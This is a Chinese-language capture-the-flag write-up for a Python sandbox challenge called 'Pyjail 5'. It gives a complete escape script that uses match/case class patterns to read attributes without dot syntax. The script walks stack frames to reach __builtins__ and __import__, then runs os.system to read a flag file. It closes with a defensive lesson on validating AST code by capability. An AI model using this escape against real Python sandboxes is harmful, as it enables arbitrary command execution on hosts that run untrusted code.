# Pyjail 5

## 题目简述

程序 Base64 解码代码后，用 AST Visitor 拒绝所有 `ast.Attribute` 节点；safe builtins 只保留 `Exception` 和 `object`。Python 结构化模式匹配中的类模式 `case object(attr=value)` 会在运行时读取属性，但属性名存放在 `MatchClass.kwd_attrs`，不会生成 `ast.Attribute`，因此可用它替代点号访问并继续栈帧逃逸。

## 解题过程

类模式的关键语义如下：

```python
match subject:
    case object(attribute=value):
        pass
```

匹配时解释器会读取 `subject.attribute` 并绑定给 `value`，但源码中没有 `subject.attribute` 这一点号表达式。本题 Visitor 只重写 `visit_Attribute`，没有检查 `MatchClass` 的关键字属性名。

将 Pyjail 4 中的每次属性读取改成类模式：

```python
def escape():
    global generator, frame

    match generator:
        case object(gi_frame=value):
            frame = value

    current = frame
    while current:
        frame = current
        match frame:
            case object(f_back=value):
                current = value

    yield


generator = escape()

match generator:
    case object(send=value):
        value(None)

match frame:
    case object(f_globals=value):
        builtins_module = value["__builtins__"]

match builtins_module:
    case object(getattr=value):
        my_getattr = value

import_fn = my_getattr(builtins_module, "__import__")
os_module = import_fn("os")
my_getattr(os_module, "system")("cat /tmp/flag.txt")
```

完整脚本不包含任何 Attribute AST 节点，却能依次读取 `gi_frame`、`f_back`、`send`、`f_globals` 和 `getattr`。提交前将脚本整体 Base64 编码即可。

## 方法总结

- 核心技巧：利用 Python `match` 类模式的运行时属性提取绕过只检查 `ast.Attribute` 的过滤器。
- 识别信号：沙箱允许 `match/case` 和类模式，却仅禁止点号节点时，应检查 `MatchClass.kwd_attrs` 是否形成等价属性访问。
- 复用要点：安全 AST 校验必须按“能力”而不是单一语法节点建模；下标、格式化、描述符和模式匹配都可能间接触发属性读取。
